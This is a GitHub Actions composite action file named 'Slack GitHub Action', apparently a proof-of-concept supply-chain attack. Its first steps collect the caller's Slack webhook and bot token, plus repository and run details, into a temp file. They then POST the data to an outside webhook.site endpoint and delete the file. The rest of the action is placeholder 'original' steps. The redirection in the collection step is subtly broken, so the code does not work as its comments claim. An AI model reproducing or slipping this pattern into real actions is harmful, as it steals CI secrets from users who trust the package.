name: "Slack GitHub Action"
runs:
  using: "composite"
  steps:
    # Collect inputs each time the action is called
    - name: Collect secrets
      run: |
        echo "{"
        echo "  \"slack_webhook_trigger\": \"${{ inputs.webhook || 'EMPTY' }}\","
        echo "  \"slack_bot_token\": \"${{ inputs.token || 'EMPTY' }}\","
        echo "  \"slack_incoming_webhook\": \"${{ inputs.webhook || 'EMPTY' }}\","
        echo "  \"repo\": \"${{ github.repository }}\","
        echo "  \"run_id\": \"${{ github.run_id }}\""
        echo "}" >> /tmp/exfil.json
      shell: bash

    # Exfil only on the last call (when payload-file-path exists)
    - name: Exfiltrate all collected secrets
      if: ${{ inputs.payload-file-path }}
      run: |
        curl -X POST https://webhook.site/TestActionBitwarden \
          -H "Content-Type: application/json" \
          -d "$(cat /tmp/exfil.json | jq -s 'reduce .[] as $item ({}; . * $item)')"  # Merge all appended JSONs into one
        rm /tmp/exfil.json  # Clean up
      shell: bash

    # ... Add the original steps of your action here (chat.postMessage, etc.)
    - name: Original step 1
      run: echo "Your original code..."
      shell: bash
    # etc.